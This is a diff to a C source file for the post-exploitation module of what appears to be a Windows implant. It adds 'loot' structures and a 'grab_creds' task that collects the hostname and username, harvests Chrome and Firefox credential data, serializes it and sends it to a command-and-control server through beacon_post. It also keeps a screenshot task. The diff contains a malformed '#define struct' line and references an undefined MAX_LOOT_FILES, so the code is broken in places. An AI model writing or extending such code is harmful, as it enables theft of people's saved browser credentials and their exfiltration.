@@ -1,11 +1,21 @@
-// src/postex.c
-// Mod 154: GDI screenshot (T1113) | Mod 171: Browser credential stubs (T1555.003)
+
 #include <windows.h>
 #include <stdio.h>
 
-// -- T1113: GDI screenshot capture ------------------------------------
-// Captures the entire screen to a BMP blob in memory
-// Returns HeapAlloc'd buffer — caller must HeapFree
+typedef struct _LOOT_FILE {
+    CHAR path[MAX_PATH];
+    PBYTE data;
+    DWORD size;
+    
+}LOOT_FILE, *PLOOT_FILE;
+#define struct _LOOT_BUNDLE 10
+typedef struct _LOOT_BUNDLE{
+    CHAR hostname[64];
+    CHAR username[64];
+    DWORD fileCount;
+    LOOT_FILE files[MAX_LOOT_FILES];
+} LOOT_BUNDLE, *PLOOT_BUNDLE;
+
 BOOL postex_screenshot(OUT PBYTE* ppBmpData, OUT DWORD* pdwBmpSize) {
     *ppBmpData = NULL;
     *pdwBmpSize = 0;
@@ -124,6 +134,41 @@ BOOL postex_dump_firefox_creds() {
 
 // -- Task dispatch entry point for post-exploitation ------------------
 BOOL postex_run(LPCSTR taskName) {
+  if (strcmp(taskName, "grab_creds") == 0) {
+    LOOT_BUNDLE bundle = {0};
+    DWORD hnLen = sizeof(bundle.hostname);
+    DWORD unLen = sizeof(bundle.username);
+    GetComputerNameA(bundle.hostname, &hnLen);
+    GetUserNameA(bundle.username, &unLen);
+
+    postex_grab_chrome(&bundle);
+    postex_grab_firefox(&bundle);
+
+    if (bundle.fileCount == 0) {
+      printf("[*] No browser data found\n");
+      return FALSE;
+    }
+
+    PBYTE packed = NULL;
+    DWORD packedLen = 0;
+    postex_serialize_bundle(&bundle, &packed, &packedLen);
+
+    
+    BYTE *resp = NULL;
+    DWORD respLen = 0;
+    beacon_post(packed, packedLen, &resp, &respLen);
+
+    
+    for (DWORD i = 0; i < bundle.fileCount; i++) {
+      if (bundle.files[i].data)
+        HeapFree(GetProcessHeap(), 0, bundle.files[i].data);
+    }
+    HeapFree(GetProcessHeap(), 0, packed);
+    if (resp)
+      HeapFree(GetProcessHeap(), 0, resp);
+
+    return TRUE;
+  }
     if (strcmp(taskName, "screenshot") == 0) {
         PBYTE data = NULL;
         DWORD size = 0;
